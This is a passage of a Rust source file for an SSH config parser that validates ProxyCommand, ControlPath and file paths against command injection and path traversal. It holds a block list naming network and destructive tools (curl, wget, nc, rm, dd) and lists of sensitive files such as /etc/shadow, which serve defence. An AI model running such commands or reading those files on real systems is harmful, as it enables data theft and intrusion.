// Copyright 2025 Lablup Inc. and Jeongkyu Shin
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

use anyhow::{Context, Result};
use std::collections::HashMap;
use std::fmt;
use std::path::{Path, PathBuf};
#[cfg(unix)]
use std::os::unix::fs::PermissionsExt;

/// SSH configuration for a specific host
#[derive(Debug, Clone, PartialEq, Default)]
pub struct SshHostConfig {
    pub host_patterns: Vec<String>,
    pub hostname: Option<String>,
    pub user: Option<String>,
    pub port: Option<u16>,
    pub identity_files: Vec<PathBuf>,
    pub proxy_jump: Option<String>,
    pub proxy_command: Option<String>,
    pub strict_host_key_checking: Option<String>,
    pub user_known_hosts_file: Option<PathBuf>,
    pub global_known_hosts_file: Option<PathBuf>,
    pub forward_agent: Option<bool>,
    pub forward_x11: Option<bool>,
    pub server_alive_interval: Option<u32>,
    pub server_alive_count_max: Option<u32>,
    pub connect_timeout: Option<u32>,
    pub connection_attempts: Option<u32>,
    pub batch_mode: Option<bool>,
    pub compression: Option<bool>,
    pub tcp_keep_alive: Option<bool>,
    pub preferred_authentications: Vec<String>,
    pub pubkey_authentication: Option<bool>,
    pub password_authentication: Option<bool>,
    pub keyboard_interactive_authentication: Option<bool>,
    pub gssapi_authentication: Option<bool>,
    pub host_key_algorithms: Vec<String>,
    pub kex_algorithms: Vec<String>,
    pub ciphers: Vec<String>,
    pub macs: Vec<String>,
    pub send_env: Vec<String>,
    pub set_env: HashMap<String, String>,
    pub local_forward: Vec<String>,
    pub remote_forward: Vec<String>,
    pub dynamic_forward: Vec<String>,
    pub request_tty: Option<String>,
    pub escape_char: Option<String>,
    pub log_level: Option<String>,
    pub syslog_facility: Option<String>,
    pub protocol: Vec<String>,
    pub address_family: Option<String>,
    pub bind_address: Option<String>,
    pub clear_all_forwardings: Option<bool>,
    pub control_master: Option<String>,
    pub control_path: Option<String>,
    pub control_persist: Option<String>,
}

impl fmt::Display for SshHostConfig {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "Host {}", self.host_patterns.join(" "))?;
        if let Some(ref hostname) = self.hostname {
            write!(f, " ({hostname})")?;
        }
        if let Some(ref user) = self.user {
            write!(f, " user={user}")?;
        }
        if let Some(port) = self.port {
            write!(f, " port={port}")?;
        }
        Ok(())
    }
}

/// SSH configuration parser and resolver
#[derive(Debug, Clone, Default)]
pub struct SshConfig {
    pub hosts: Vec<SshHostConfig>,
}

impl SshConfig {
    /// Create a new empty SSH configuration
    pub fn new() -> Self {
        Self::default()
    }

    /// Load SSH configuration from a file
    pub fn load_from_file<P: AsRef<Path>>(path: P) -> Result<Self> {
        let path = path.as_ref();
        let content = std::fs::read_to_string(path)
            .with_context(|| format!("Failed to read SSH config file: {}", path.display()))?;

        Self::parse(&content)
            .with_context(|| format!("Failed to parse SSH config file: {}", path.display()))
    }

    /// Load SSH configuration from the default locations
    pub fn load_default() -> Result<Self> {
        // Try user-specific SSH config first
        if let Some(home_dir) = dirs::home_dir() {
            let user_config = home_dir.join(".ssh").join("config");
            if user_config.exists() {
                return Self::load_from_file(&user_config);
            }
        }

        // Try system-wide SSH config
        let system_config = Path::new("/etc/ssh/ssh_config");
        if system_config.exists() {
            return Self::load_from_file(system_config);
        }

        // Return empty config if no files found
        Ok(Self::new())
    }

    /// Parse SSH configuration from a string
    pub fn parse(content: &str) -> Result<Self> {
        let mut hosts = Vec::new();
        let mut current_host: Option<SshHostConfig> = None;
        let mut line_number = 0;

        for line in content.lines() {
            line_number += 1;
            let line = line.trim();

            // Skip empty lines and comments
            if line.is_empty() || line.starts_with('#') {
                continue;
            }

            // Split line into keyword and arguments
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.is_empty() {
                continue;
            }

            let keyword = parts[0].to_lowercase();
            let args = &parts[1..];

            match keyword.as_str() {
                "host" => {
                    // Save previous host config
                    if let Some(host) = current_host.take() {
                        hosts.push(host);
                    }

                    // Start new host config
                    if args.is_empty() {
                        anyhow::bail!(
                            "Host directive requires at least one pattern at line {}",
                            line_number
                        );
                    }

                    let host_config = SshHostConfig {
                        host_patterns: args.iter().map(|s| s.to_string()).collect(),
                        ..Default::default()
                    };
                    current_host = Some(host_config);
                }
                _ => {
                    // Configuration option
                    if let Some(ref mut host) = current_host {
                        Self::parse_option(host, &keyword, args, line_number)
                            .with_context(|| format!("Error at line {line_number}: {line}"))?;
                    } else if keyword != "host" {
                        // Global options outside of any Host block are ignored for now
                        // In a full SSH config parser, these would set global defaults
                        tracing::debug!(
                            "Ignoring global option '{}' at line {}",
                            keyword,
                            line_number
                        );
                    }
                }
            }
        }

        // Don't forget the last host
        if let Some(host) = current_host {
            hosts.push(host);
        }

        Ok(Self { hosts })
    }

    /// Parse a configuration option for a host
    fn parse_option(
        host: &mut SshHostConfig,
        keyword: &str,
        args: &[&str],
        line_number: usize,
    ) -> Result<()> {
        match keyword {
            "hostname" => {
                if args.is_empty() {
                    anyhow::bail!("HostName requires a value at line {}", line_number);
                }
                host.hostname = Some(args[0].to_string());
            }
            "user" => {
                if args.is_empty() {
                    anyhow::bail!("User requires a value at line {}", line_number);
                }
                host.user = Some(args[0].to_string());
            }
            "port" => {
                if args.is_empty() {
                    anyhow::bail!("Port requires a value at line {}", line_number);
                }
                let port: u16 = args[0].parse().with_context(|| {
                    format!("Invalid port number '{}' at line {}", args[0], line_number)
                })?;
                host.port = Some(port);
            }
            "identityfile" => {
                if args.is_empty() {
                    anyhow::bail!("IdentityFile requires a value at line {}", line_number);
                }
                let path = Self::secure_validate_path(args[0], "identity", line_number)
                    .with_context(|| format!("Invalid IdentityFile path at line {}", line_number))?;
                host.identity_files.push(path);
            }
            "identitiesonly" => {
                if args.is_empty() {
                    anyhow::bail!("IdentitiesOnly requires a value at line {}", line_number);
                }
                // Parse yes/no and store in identity_files behavior (implicit)
                let value = Self::parse_yes_no(args[0], line_number)?;
                if value {
                    // When IdentitiesOnly is yes, clear default identity files
                    // This is handled during resolution
                }
            }
            "proxyjump" => {
                if args.is_empty() {
                    anyhow::bail!("ProxyJump requires a value at line {}", line_number);
                }
                host.proxy_jump = Some(args.join(" "));
            }
            "proxycommand" => {
                if args.is_empty() {
                    anyhow::bail!("ProxyCommand requires a value at line {}", line_number);
                }
                let command = args.join(" ");
                Self::validate_executable_string(&command, "ProxyCommand", line_number)?;
                host.proxy_command = Some(command);
            }
            "stricthostkeychecking" => {
                if args.is_empty() {
                    anyhow::bail!(
                        "StrictHostKeyChecking requires a value at line {}",
                        line_number
                    );
                }
                host.strict_host_key_checking = Some(args[0].to_string());
            }
            "userknownhostsfile" => {
                if args.is_empty() {
                    anyhow::bail!(
                        "UserKnownHostsFile requires a value at line {}",
                        line_number
                    );
                }
                let path = Self::secure_validate_path(args[0], "known_hosts", line_number)
                    .with_context(|| format!("Invalid UserKnownHostsFile path at line {}", line_number))?;
                host.user_known_hosts_file = Some(path);
            }
            "globalknownhostsfile" => {
                if args.is_empty() {
                    anyhow::bail!(
                        "GlobalKnownHostsFile requires a value at line {}",
                        line_number
                    );
                }
                let path = Self::secure_validate_path(args[0], "known_hosts", line_number)
                    .with_context(|| format!("Invalid GlobalKnownHostsFile path at line {}", line_number))?;
                host.global_known_hosts_file = Some(path);
            }
            "forwardagent" => {
                if args.is_empty() {
                    anyhow::bail!("ForwardAgent requires a value at line {}", line_number);
                }
                host.forward_agent = Some(Self::parse_yes_no(args[0], line_number)?);
            }
            "forwardx11" => {
                if args.is_empty() {
                    anyhow::bail!("ForwardX11 requires a value at line {}", line_number);
                }
                host.forward_x11 = Some(Self::parse_yes_no(args[0], line_number)?);
            }
            "serveraliveinterval" => {
                if args.is_empty() {
                    anyhow::bail!(
                        "ServerAliveInterval requires a value at line {}",
                        line_number
                    );
                }
                let interval: u32 = args[0].parse().with_context(|| {
                    format!(
                        "Invalid ServerAliveInterval value '{}' at line {}",
                        args[0], line_number
                    )
                })?;
                host.server_alive_interval = Some(interval);
            }
            "serveralivecountmax" => {
                if args.is_empty() {
                    anyhow::bail!(
                        "ServerAliveCountMax requires a value at line {}",
                        line_number
                    );
                }
                let count: u32 = args[0].parse().with_context(|| {
                    format!(
                        "Invalid ServerAliveCountMax value '{}' at line {}",
                        args[0], line_number
                    )
                })?;
                host.server_alive_count_max = Some(count);
            }
            "connecttimeout" => {
                if args.is_empty() {
                    anyhow::bail!("ConnectTimeout requires a value at line {}", line_number);
                }
                let timeout: u32 = args[0].parse().with_context(|| {
                    format!(
                        "Invalid ConnectTimeout value '{}' at line {}",
                        args[0], line_number
                    )
                })?;
                host.connect_timeout = Some(timeout);
            }
            "connectionattempts" => {
                if args.is_empty() {
                    anyhow::bail!(
                        "ConnectionAttempts requires a value at line {}",
                        line_number
                    );
                }
                let attempts: u32 = args[0].parse().with_context(|| {
                    format!(
                        "Invalid ConnectionAttempts value '{}' at line {}",
                        args[0], line_number
                    )
                })?;
                host.connection_attempts = Some(attempts);
            }
            "batchmode" => {
                if args.is_empty() {
                    anyhow::bail!("BatchMode requires a value at line {}", line_number);
                }
                host.batch_mode = Some(Self::parse_yes_no(args[0], line_number)?);
            }
            "compression" => {
                if args.is_empty() {
                    anyhow::bail!("Compression requires a value at line {}", line_number);
                }
                host.compression = Some(Self::parse_yes_no(args[0], line_number)?);
            }
            "tcpkeepalive" => {
                if args.is_empty() {
                    anyhow::bail!("TCPKeepAlive requires a value at line {}", line_number);
                }
                host.tcp_keep_alive = Some(Self::parse_yes_no(args[0], line_number)?);
            }
            "preferredauthentications" => {
                if args.is_empty() {
                    anyhow::bail!(
                        "PreferredAuthentications requires a value at line {}",
                        line_number
                    );
                }
                host.preferred_authentications = args
                    .join(",")
                    .split(',')
                    .map(|s| s.trim().to_string())
                    .collect();
            }
            "pubkeyauthentication" => {
                if args.is_empty() {
                    anyhow::bail!(
                        "PubkeyAuthentication requires a value at line {}",
                        line_number
                    );
                }
                host.pubkey_authentication = Some(Self::parse_yes_no(args[0], line_number)?);
            }
            "passwordauthentication" => {
                if args.is_empty() {
                    anyhow::bail!(
                        "PasswordAuthentication requires a value at line {}",
                        line_number
                    );
                }
                host.password_authentication = Some(Self::parse_yes_no(args[0], line_number)?);
            }
            "kbdinteractiveauthentication" => {
                if args.is_empty() {
                    anyhow::bail!(
                        "KbdInteractiveAuthentication requires a value at line {}",
                        line_number
                    );
                }
                host.keyboard_interactive_authentication =
                    Some(Self::parse_yes_no(args[0], line_number)?);
            }
            "gssapiauthentication" => {
                if args.is_empty() {
                    anyhow::bail!(
                        "GSSAPIAuthentication requires a value at line {}",
                        line_number
                    );
                }
                host.gssapi_authentication = Some(Self::parse_yes_no(args[0], line_number)?);
            }
            "hostkeyalgorithms" => {
                if args.is_empty() {
                    anyhow::bail!("HostKeyAlgorithms requires a value at line {}", line_number);
                }
                host.host_key_algorithms = args
                    .join(",")
                    .split(',')
                    .map(|s| s.trim().to_string())
                    .collect();
            }
            "kexalgorithms" => {
                if args.is_empty() {
                    anyhow::bail!("KexAlgorithms requires a value at line {}", line_number);
                }
                host.kex_algorithms = args
                    .join(",")
                    .split(',')
                    .map(|s| s.trim().to_string())
                    .collect();
            }
            "ciphers" => {
                if args.is_empty() {
                    anyhow::bail!("Ciphers requires a value at line {}", line_number);
                }
                host.ciphers = args
                    .join(",")
                    .split(',')
                    .map(|s| s.trim().to_string())
                    .collect();
            }
            "macs" => {
                if args.is_empty() {
                    anyhow::bail!("MACs requires a value at line {}", line_number);
                }
                host.macs = args
                    .join(",")
                    .split(',')
                    .map(|s| s.trim().to_string())
                    .collect();
            }
            "sendenv" => {
                if args.is_empty() {
                    anyhow::bail!("SendEnv requires a value at line {}", line_number);
                }
                host.send_env.extend(args.iter().map(|s| s.to_string()));
            }
            "setenv" => {
                if args.len() < 2 {
                    anyhow::bail!("SetEnv requires name=value at line {}", line_number);
                }
                for arg in args {
                    if let Some(eq_pos) = arg.find('=') {
                        let name = arg[..eq_pos].to_string();
                        let value = arg[eq_pos + 1..].to_string();
                        host.set_env.insert(name, value);
                    } else {
                        anyhow::bail!(
                            "Invalid SetEnv format '{}' at line {} (expected name=value)",
                            arg,
                            line_number
                        );
                    }
                }
            }
            "localforward" => {
                if args.is_empty() {
                    anyhow::bail!("LocalForward requires a value at line {}", line_number);
                }
                host.local_forward.push(args.join(" "));
            }
            "remoteforward" => {
                if args.is_empty() {
                    anyhow::bail!("RemoteForward requires a value at line {}", line_number);
                }
                host.remote_forward.push(args.join(" "));
            }
            "dynamicforward" => {
                if args.is_empty() {
                    anyhow::bail!("DynamicForward requires a value at line {}", line_number);
                }
                host.dynamic_forward.push(args.join(" "));
            }
            "requesttty" => {
                if args.is_empty() {
                    anyhow::bail!("RequestTTY requires a value at line {}", line_number);
                }
                host.request_tty = Some(args[0].to_string());
            }
            "escapechar" => {
                if args.is_empty() {
                    anyhow::bail!("EscapeChar requires a value at line {}", line_number);
                }
                host.escape_char = Some(args[0].to_string());
            }
            "loglevel" => {
                if args.is_empty() {
                    anyhow::bail!("LogLevel requires a value at line {}", line_number);
                }
                host.log_level = Some(args[0].to_string());
            }
            "syslogfacility" => {
                if args.is_empty() {
                    anyhow::bail!("SyslogFacility requires a value at line {}", line_number);
                }
                host.syslog_facility = Some(args[0].to_string());
            }
            "protocol" => {
                if args.is_empty() {
                    anyhow::bail!("Protocol requires a value at line {}", line_number);
                }
                host.protocol = args
                    .join(",")
                    .split(',')
                    .map(|s| s.trim().to_string())
                    .collect();
            }
            "addressfamily" => {
                if args.is_empty() {
                    anyhow::bail!("AddressFamily requires a value at line {}", line_number);
                }
                host.address_family = Some(args[0].to_string());
            }
            "bindaddress" => {
                if args.is_empty() {
                    anyhow::bail!("BindAddress requires a value at line {}", line_number);
                }
                host.bind_address = Some(args[0].to_string());
            }
            "clearallforwardings" => {
                if args.is_empty() {
                    anyhow::bail!(
                        "ClearAllForwardings requires a value at line {}",
                        line_number
                    );
                }
                host.clear_all_forwardings = Some(Self::parse_yes_no(args[0], line_number)?);
            }
            "controlmaster" => {
                if args.is_empty() {
                    anyhow::bail!("ControlMaster requires a value at line {}", line_number);
                }
                host.control_master = Some(args[0].to_string());
            }
            "controlpath" => {
                if args.is_empty() {
                    anyhow::bail!("ControlPath requires a value at line {}", line_number);
                }
                let path = args[0].to_string();
                Self::validate_executable_string(&path, "ControlPath", line_number)?;
                host.control_path = Some(path);
            }
            "controlpersist" => {
                if args.is_empty() {
                    anyhow::bail!("ControlPersist requires a value at line {}", line_number);
                }
                host.control_persist = Some(args[0].to_string());
            }
            _ => {
                // Unknown option - log a warning but continue
                tracing::warn!(
                    "Unknown SSH config option '{}' at line {}",
                    keyword,
                    line_number
                );
            }
        }

        Ok(())
    }

    /// Parse a yes/no value
    fn parse_yes_no(value: &str, line_number: usize) -> Result<bool> {
        match value.to_lowercase().as_str() {
            "yes" | "true" | "1" => Ok(true),
            "no" | "false" | "0" => Ok(false),
            _ => anyhow::bail!(
                "Invalid yes/no value '{}' at line {} (expected yes/no)",
                value,
                line_number
            ),
        }
    }

    /// Validate strings that could be executed to prevent command injection
    /// 
    /// # Security Note
    /// This function validates potentially executable strings (ProxyCommand, ControlPath, etc.)
    /// to prevent command injection vulnerabilities. It blocks dangerous shell metacharacters
    /// that could be used to inject arbitrary commands.
    /// 
    /// # Arguments
    /// * `value` - The string value to validate
    /// * `option_name` - The SSH config option name (for error messages)  
    /// * `line_number` - The line number in the config file (for error messages)
    ///
    /// # Returns
    /// * `Ok(())` if the value is safe
    /// * `Err(anyhow::Error)` if the value contains dangerous patterns
    fn validate_executable_string(value: &str, option_name: &str, line_number: usize) -> Result<()> {
        // Define dangerous shell metacharacters that could enable command injection
        const DANGEROUS_CHARS: &[char] = &[
            ';',    // Command separator
            '&',    // Background process / command separator
            '|',    // Pipe
            '`',    // Command substitution (backticks)
            '$',    // Variable expansion / command substitution
            '>',    // Output redirection
            '<',    // Input redirection
            '\n',   // Newline (command separator)
            '\r',   // Carriage return
            '\0',   // Null byte
        ];

        // Check for dangerous characters
        if let Some(dangerous_char) = value.chars().find(|c| DANGEROUS_CHARS.contains(c)) {
            anyhow::bail!(
                "Security violation: {} contains dangerous character '{}' at line {}. \
                 This could enable command injection attacks.",
                option_name,
                dangerous_char,
                line_number
            );
        }

        // Check for dangerous command substitution patterns
        if value.contains("$(") || value.contains("${") {
            anyhow::bail!(
                "Security violation: {} contains command substitution pattern at line {}. \
                 This could enable command injection attacks.",
                option_name,
                line_number
            );
        }

        // Check for double quotes that could break out of string context
        // Count unescaped quotes to detect potential quote injection
        let mut quote_count = 0;
        let chars: Vec<char> = value.chars().collect();
        for (i, &c) in chars.iter().enumerate() {
            if c == '"' {
                // Check if this quote is escaped by counting preceding backslashes
                let mut backslash_count = 0;
                let mut pos = i;
                while pos > 0 {
                    pos -= 1;
                    if chars[pos] == '\\' {
                        backslash_count += 1;
                    } else {
                        break;
                    }
                }
                // If even number of backslashes (including 0), quote is not escaped
                if backslash_count % 2 == 0 {
                    quote_count += 1;
                }
            }
        }

        // Odd number of unescaped quotes suggests potential quote injection
        if quote_count % 2 != 0 {
            anyhow::bail!(
                "Security violation: {} contains unmatched quote at line {}. \
                 This could enable command injection attacks.",
                option_name,
                line_number
            );
        }

        // Additional validation for ControlPath - it should be a path, not a command
        if option_name == "ControlPath" {
            // ControlPath should not contain spaces (legitimate paths with spaces should be quoted)
            // and should not start with suspicious patterns
            if value.trim_start().starts_with('-') {
                anyhow::bail!(
                    "Security violation: ControlPath starts with '-' at line {}. \
                     This could be interpreted as a command flag.",
                    line_number
                );
            }

            // ControlPath commonly uses %h, %p, %r, %u substitution tokens - these are safe
            // But we should be suspicious of other % patterns that might indicate injection
            let chars: Vec<char> = value.chars().collect();
            let mut i = 0;
            while i < chars.len() {
                if chars[i] == '%' && i + 1 < chars.len() {
                    let next_char = chars[i + 1];
                    match next_char {
                        'h' | 'p' | 'r' | 'u' | 'L' | 'l' | 'n' | 'd' | '%' => {
                            // These are legitimate SSH substitution tokens
                            i += 2; // Skip both % and the token character
                        }
                        _ => {
                            // Unknown substitution pattern - potentially dangerous
                            anyhow::bail!(
                                "Security violation: ControlPath contains unknown substitution pattern '%{}' at line {}. \
                                 Only %h, %p, %r, %u, %L, %l, %n, %d, and %% are allowed.",
                                next_char,
                                line_number
                            );
                        }
                    }
                } else {
                    i += 1;
                }
            }
        }

        // Additional validation for ProxyCommand
        if option_name == "ProxyCommand" {
            // ProxyCommand "none" is a special case to disable proxy
            if value == "none" {
                return Ok(());
            }

            // Check for suspicious executable names or patterns
            let trimmed = value.trim();
            
            // Look for common injection patterns
            if trimmed.starts_with("bash ") || 
               trimmed.starts_with("sh ") || 
               trimmed.starts_with("/bin/") || 
               trimmed.starts_with("python ") ||
               trimmed.starts_with("perl ") ||
               trimmed.starts_with("ruby ") {
                // These could be legitimate but are commonly used in attacks
                tracing::warn!(
                    "ProxyCommand at line {} uses potentially risky executable '{}'. \
                     Ensure this is intentional and from a trusted source.",
                    line_number,
                    trimmed.split_whitespace().next().unwrap_or("")
                );
            }

            // Block obviously malicious patterns
            let lower_value = value.to_lowercase();
            if lower_value.contains("curl ") || 
               lower_value.contains("wget ") ||
               lower_value.contains("nc ") ||
               lower_value.contains("netcat ") ||
               lower_value.contains("rm ") ||
               lower_value.contains("dd ") ||
               lower_value.contains("cat /") {
                anyhow::bail!(
                    "Security violation: ProxyCommand contains suspicious command pattern at line {}. \
                     Commands like curl, wget, nc, rm, dd are not typical for SSH proxying.",
                    line_number
                );
            }
        }

        Ok(())
    }

    /// Securely validate and expand a file path to prevent path traversal attacks
    ///
    /// # Security Features
    /// - Prevents directory traversal with ../ sequences
    /// - Validates paths after expansion and canonicalization
    /// - Checks file permissions on Unix systems (warns if identity files are world-readable)
    /// - Ensures paths don't point to sensitive system files
    /// - Handles both absolute and relative paths correctly
    /// - Supports safe tilde expansion
    ///
    /// # Arguments
    /// * `path` - The file path to validate (may contain ~/ and environment variables)
    /// * `path_type` - The type of path for security context ("identity", "known_hosts", or "other")
    /// * `line_number` - Line number for error reporting
    ///
    /// # Returns
    /// * `Ok(PathBuf)` if the path is safe and valid
    /// * `Err(anyhow::Error)` if the path is unsafe or invalid
    fn secure_validate_path(path: &str, path_type: &str, line_number: usize) -> Result<PathBuf> {
        // First expand the path using the existing logic
        let expanded_path = Self::expand_path_internal(path);
        
        // Convert to string for analysis
        let path_str = expanded_path.to_string_lossy();
        
        // Check for directory traversal sequences
        if path_str.contains("../") || path_str.contains("..\\") {
            anyhow::bail!(
                "Security violation: {} path contains directory traversal sequence '..' at line {}. \
                 Path traversal attacks are not allowed.",
                path_type,
                line_number
            );
        }
        
        // Check for null bytes and other dangerous characters
        if path_str.contains('\0') {
            anyhow::bail!(
                "Security violation: {} path contains null byte at line {}. \
                 This could be used for path truncation attacks.",
                path_type,
                line_number
            );
        }
        
        // Try to canonicalize the path to resolve any remaining relative components
        let canonical_path = if expanded_path.exists() {
            match expanded_path.canonicalize() {
                Ok(canonical) => canonical,
                Err(e) => {
                    tracing::debug!(
                        "Could not canonicalize {} path '{}' at line {}: {}. Using expanded path as-is.",
                        path_type, path_str, line_number, e
                    );
                    expanded_path.clone()
                }
            }
        } else {
            // For non-existent files, just ensure the parent directory is safe
            expanded_path.clone()
        };
        
        // Re-check for traversal in the canonical path
        let canonical_str = canonical_path.to_string_lossy();
        if canonical_str.contains("..") {
            // This might be legitimate (like a directory literally named "..something")
            // but we need to be very careful about parent directory references
            if canonical_str.split('/').any(|component| component == "..") ||
               canonical_str.split('\\').any(|component| component == "..") {
                anyhow::bail!(
                    "Security violation: Canonicalized {} path '{}' contains parent directory references at line {}. \
                     This could indicate a path traversal attempt.",
                    path_type,
                    canonical_str,
                    line_number
                );
            }
        }
        
        // Additional security checks based on path type
        match path_type {
            "identity" => {
                Self::validate_identity_file_security(&canonical_path, line_number)?;
            }
            "known_hosts" => {
                Self::validate_known_hosts_file_security(&canonical_path, line_number)?;
            }
            _ => {
                // General path validation for other file types
                Self::validate_general_file_security(&canonical_path, line_number)?;
            }
        }
        
        Ok(canonical_path)
    }
    
    /// Validate security properties of identity files
    fn validate_identity_file_security(path: &Path, line_number: usize) -> Result<()> {
        // Check for sensitive system paths
        let path_str = path.to_string_lossy();
        
        // Block access to critical system files
        let sensitive_patterns = [
            "/etc/passwd", "/etc/shadow", "/etc/group",
            "/proc/", "/sys/", "/dev/",
            "/boot/", "/usr/bin/", "/bin/", "/sbin/",
            "\\Windows\\", "\\System32\\", "\\Program Files\\"
        ];
        
        for pattern in &sensitive_patterns {
            if path_str.contains(pattern) {
                anyhow::bail!(
                    "Security violation: Identity file path '{}' at line {} points to sensitive system location. \
                     Access to system files is not allowed for security reasons.",
                    path_str,
                    line_number
                );
            }
        }
        
        // On Unix systems, check file permissions if the file exists
        #[cfg(unix)]
        if path.exists() && path.is_file() {
            if let Ok(metadata) = std::fs::metadata(path) {
                let permissions = metadata.permissions();
                let mode = permissions.mode();
                
                // Check if file is world-readable (dangerous for private keys)
                if mode & 0o004 != 0 {
                    tracing::warn!(
                        "Security warning: Identity file '{}' at line {} is world-readable. \
                         Private SSH keys should not be readable by other users (chmod 600 recommended).",
                        path_str,
                        line_number
                    );
                }
                
                // Check if file is group-readable (also not ideal for private keys)
                if mode & 0o040 != 0 {
                    tracing::warn!(
                        "Security warning: Identity file '{}' at line {} is group-readable. \
                         Private SSH keys should only be readable by the owner (chmod 600 recommended).",
                        path_str,
                        line_number
                    );
                }
                
                // Check if file is world-writable (very dangerous)
                if mode & 0o002 != 0 {
                    anyhow::bail!(
                        "Security violation: Identity file '{}' at line {} is world-writable. \
                         This is extremely dangerous and must be fixed immediately.",
                        path_str,
                        line_number
                    );
                }
            }
        }
        
        Ok(())
    }
    
    /// Validate security properties of known_hosts files
    fn validate_known_hosts_file_security(path: &Path, line_number: usize) -> Result<()> {
        let path_str = path.to_string_lossy();
        
        // Block access to critical system files
        let sensitive_patterns = [
            "/etc/passwd", "/etc/shadow", "/etc/group",
            "/proc/", "/sys/", "/dev/",
            "/boot/", "/usr/bin/", "/bin/", "/sbin/",
            "\\Windows\\", "\\System32\\", "\\Program Files\\"
        ];
        
        for pattern in &sensitive_patterns {
            if path_str.contains(pattern) {
                anyhow::bail!(
                    "Security violation: Known hosts file path '{}' at line {} points to sensitive system location. \
                     Access to system files is not allowed for security reasons.",
                    path_str,
                    line_number
                );
            }
        }
        
        // Ensure known_hosts files are in reasonable locations
        let path_lower = path_str.to_lowercase();
        if !path_lower.contains("ssh") && !path_lower.contains("known") && 
           !path_str.contains("/.") && !path_str.starts_with("/etc/ssh/") &&
           !path_str.starts_with("/usr/") && !path_str.contains("/home/") &&
           !path_str.contains("/Users/") {
            tracing::warn!(
                "Security warning: Known hosts file '{}' at line {} is in an unusual location. \
                 Ensure this is intentional and the file is trustworthy.",
                path_str,
                line_number
            );
        }
        
        Ok(())
    }
    
    /// Validate security properties of general files
    fn validate_general_file_security(path: &Path, line_number: usize) -> Result<()> {
        let path_str = path.to_string_lossy();
        
        // Block access to the most critical system files
        let forbidden_patterns = [
            "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/sudoers",
            "/proc/", "/sys/", "/dev/random", "/dev/urandom",
            "/boot/", "/usr/bin/", "/bin/", "/sbin/",
            "\\Windows\\System32\\", "\\Windows\\SysWOW64\\"
        ];
        
        for pattern in &forbidden_patterns {
            if path_str.contains(pattern) {
                anyhow::bail!(
                    "Security violation: File path '{}' at line {} points to forbidden system location. \
                     Access to this location is not allowed for security reasons.",
                    path_str,
                    line_number
                );
            }
        }
        
        Ok(())
    }
    
    /// Expand tilde and environment variables in a path (internal implementation)
    fn expand_path_internal(path: &str) -> PathBuf {
        let path = if let Some(stripped) = path.strip_prefix("~/") {
            if let Some(home) = dirs::home_dir() {
                home.join(stripped)
            } else {
                PathBuf::from(path)
            }
        } else {
            PathBuf::from(path)
        };

        // Simple environment variable expansion (basic implementation)
        let path_str = path.to_string_lossy();
        if path_str.contains('$') {
            // This is a simplified expansion - a full implementation would handle
            // ${VAR}, $VAR, and proper shell-like expansion
            let mut expanded = path_str.to_string();
            for (key, value) in std::env::vars() {
                expanded = expanded.replace(&format!("${key}"), &value);
                expanded = expanded.replace(&format!("${{{key}}}"), &value);
            }
            PathBuf::from(expanded)
        } else {
            path
        }
    }
    
    /// Legacy expand_path function for backward compatibility (now uses secure validation)
    fn expand_path(path: &str) -> PathBuf {
        // Use the internal expansion without security validation for backward compatibility
        // This should only be used in non-security-critical contexts
        Self::expand_path_internal(path)
    }

    /// Find configuration for a specific hostname
    pub fn find_host_config(&self, hostname: &str) -> SshHostConfig {
        let mut merged_config = SshHostConfig::default();

        for host_config in &self.hosts {
            if Self::matches_host_pattern(hostname, &host_config.host_patterns) {
                Self::merge_host_config(&mut merged_config, host_config);
            }
        }

        merged_config
    }

    /// Check if a hostname matches any of the host patterns
    fn matches_host_pattern(hostname: &str, patterns: &[String]) -> bool {
        for pattern in patterns {
            if Self::matches_pattern(hostname, pattern) {
                return true;
            }
        }
        false
    }

    /// Check if a hostname matches a single pattern (supports wildcards)
    fn matches_pattern(hostname: &str, pattern: &str) -> bool {
        // Handle negation (!)
        if let Some(neg_pattern) = pattern.strip_prefix('!') {
            return !Self::matches_pattern(hostname, neg_pattern);
        }

        // Simple wildcard matching
        if pattern.contains('*') || pattern.contains('?') {
            Self::wildcard_match(hostname, pattern)
        } else {
            // Exact match (case insensitive)
            hostname.eq_ignore_ascii_case(pattern)
        }
    }

    /// Simple wildcard matching for patterns
    fn wildcard_match(text: &str, pattern: &str) -> bool {
        Self::wildcard_match_impl(text, pattern)
    }

    /// Internal recursive implementation for wildcard matching
    fn wildcard_match_impl(text: &str, pattern: &str) -> bool {
        let text_chars: Vec<char> = text.chars().collect();
        let pattern_chars: Vec<char> = pattern.chars().collect();

        Self::match_recursive(&text_chars, &pattern_chars, 0, 0)
    }

    /// Recursive helper for wildcard matching
    fn match_recursive(
        text_chars: &[char],
        pattern_chars: &[char],
        text_idx: usize,
        pattern_idx: usize,
    ) -> bool {
        // Base cases
        if pattern_idx >= pattern_chars.len() {
            return text_idx >= text_chars.len();
        }

        if text_idx >= text_chars.len() {
            // Check if remaining pattern is all '*'
            return pattern_chars[pattern_idx..].iter().all(|&c| c == '*');
        }

        let pattern_char = pattern_chars[pattern_idx];
        let text_char = text_chars[text_idx];

        match pattern_char {
            '*' => {
                // Try matching zero characters (skip the *)
                if Self::match_recursive(text_chars, pattern_chars, text_idx, pattern_idx + 1) {
                    return true;
                }

                // Try matching one or more characters
                if Self::match_recursive(text_chars, pattern_chars, text_idx + 1, pattern_idx) {
                    return true;
                }

                false
            }
            '?' => {
                // Match any single character
                Self::match_recursive(text_chars, pattern_chars, text_idx + 1, pattern_idx + 1)
            }
            _ => {
                // Exact character match (case insensitive)
                if text_char.eq_ignore_ascii_case(&pattern_char) {
                    Self::match_recursive(text_chars, pattern_chars, text_idx + 1, pattern_idx + 1)
                } else {
                    false
                }
            }
        }
    }

    /// Merge two host configurations (second takes precedence)
    fn merge_host_config(base: &mut SshHostConfig, overlay: &SshHostConfig) {
        // For most options, overlay takes precedence if set
        if !overlay.host_patterns.is_empty() {
            base.host_patterns = overlay.host_patterns.clone();
        }
        if overlay.hostname.is_some() {
            base.hostname = overlay.hostname.clone();
        }
        if overlay.user.is_some() {
            base.user = overlay.user.clone();
        }
        if overlay.port.is_some() {
